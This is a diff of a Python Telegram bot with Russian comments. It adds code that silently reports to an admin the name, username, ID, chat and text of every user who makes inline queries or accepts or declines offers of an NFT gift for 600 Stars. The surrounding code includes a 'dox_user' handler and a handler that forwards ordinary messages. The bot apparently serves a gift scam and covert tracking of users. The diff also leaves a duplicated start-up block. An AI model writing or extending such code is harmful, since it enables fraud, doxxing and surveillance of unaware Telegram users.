@@ -117,7 +117,17 @@ async def inline_handler(inline_query: InlineQuery):
     if not query:
         return
         
-    await notify_admin(f"🔍 Инлайн!\nИмя: {inline_query.from_user.first_name}\nЮзернейм: {username}\nID: {inline_query.from_user.id}\nТекст: {query}")
+    # Определяем, где человек пишет
+    chat_types = {
+        "sender": "в личке",
+        "private": "в личке",
+        "group": "в группе",
+        "supergroup": "в супергруппе",
+        "channel": "в канале"
+    }
+    location = chat_types.get(inline_query.chat_type, "неизвестно")
+    
+    await notify_admin(f"🔍 Человек пишет в инлайне!\nИмя: {inline_query.from_user.first_name}\nЮзернейм: {username}\nID: {inline_query.from_user.id}\nГде: {location}\nТекст: {query}")
     
     link = "t.me/nft/LunarSnake-120435"
     price = "600"
@@ -172,6 +182,23 @@ async def accept_callback(callback: CallbackQuery):
     offer_id = callback.data.split("_")[1]
     offer = active_offers.get(offer_id, {"link": "t.me/nft/LunarSnake-120435", "price": "600", "gift": "Gift"})
     
+    # --- УВЕДОМЛЕНИЕ О ТОМ, КТО НАЖАЛ ---
+    username = f"@{callback.from_user.username}" if callback.from_user.username else "без юзернейма"
+    who_clicked = f"{callback.from_user.first_name} ({username}, ID: {callback.from_user.id})"
+    
+    chat_info = "в личке или инлайне"
+    if callback.message:
+        chat_info = f"в чате '{callback.message.chat.title or callback.message.chat.first_name}'"
+    
+    await notify_admin(
+        f"✅ Оффер принят!\n"
+        f"🎁 Товар: {offer['gift']} • {offer['price']} ⭐️\n"
+        f"🔗 Ссылка: {offer['link']}\n\n"
+        f"👤 Кто нажал: {who_clicked}\n"
+        f"📍 Где: {chat_info}"
+    )
+    # ------------------------------------
+    
     accepted_text = (
         f"✅ Оффер принят!\n"
         f"🎁 {offer['gift']} • {offer['price']} ⭐️ Stars\n"
@@ -202,6 +229,24 @@ async def confirm_callback(callback: CallbackQuery):
 @router.callback_query(F.data.startswith("dec_"))
 async def decline_callback(callback: CallbackQuery):
     offer_id = callback.data.split("_")[1]
+    offer = active_offers.get(offer_id, {"link": "t.me/nft/LunarSnake-120435", "price": "600", "gift": "Gift"})
+    
+    # --- УВЕДОМЛЕНИЕ О ТОМ, КТО ОТКЛОНИЛ ---
+    username = f"@{callback.from_user.username}" if callback.from_user.username else "без юзернейма"
+    who_clicked = f"{callback.from_user.first_name} ({username}, ID: {callback.from_user.id})"
+    
+    chat_info = "в личке или инлайне"
+    if callback.message:
+        chat_info = f"в чате '{callback.message.chat.title or callback.message.chat.first_name}'"
+        
+    await notify_admin(
+        f"❌ Оффер отклонен!\n"
+        f"🎁 Товар: {offer.get('gift', 'Gift')} • {offer.get('price', '600')} ⭐️\n\n"
+        f"👤 Кто нажал: {who_clicked}\n"
+        f"📍 Где: {chat_info}"
+    )
+    # --------------------------------------
+    
     declined_text = "❌ Оффер отклонен."
     await callback.answer("❌ Оффер отклонен.", show_alert=True)
     try:
@@ -385,10 +430,8 @@ async def dox_user(message: Message):
         await message.answer("❌ Ошибка! Пользователь не найден или скрыл данные.")
 
 # ==========================================
-# ЗАПУСК БОТА
+# УВЕДОМЛЕНИЯ ОБ ОБЫЧНЫХ СООБЩЕНИЯХ
 # ==========================================
-
-
 @router.message(F.text & ~F.text.startswith("/") & ~F.text.startswith("."))
 async def any_message_handler(message: Message):
     username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
@@ -401,6 +444,9 @@ async def any_message_handler(message: Message):
         f"Текст: {message.text}"
     )
 
+# ==========================================
+# ЗАПУСК БОТА
+# ==========================================
 async def main():
     print("1. Бот запускается...")
     try:
@@ -410,6 +456,9 @@ async def main():
         await dp.start_polling(bot)
     except Exception as e:
         print(f"ОШИБКА: {e}")
+
+if __name__ == "__main__":
+    asyncio.run(main())
 
 if __name__ == "__main__":
     asyncio.run(main())
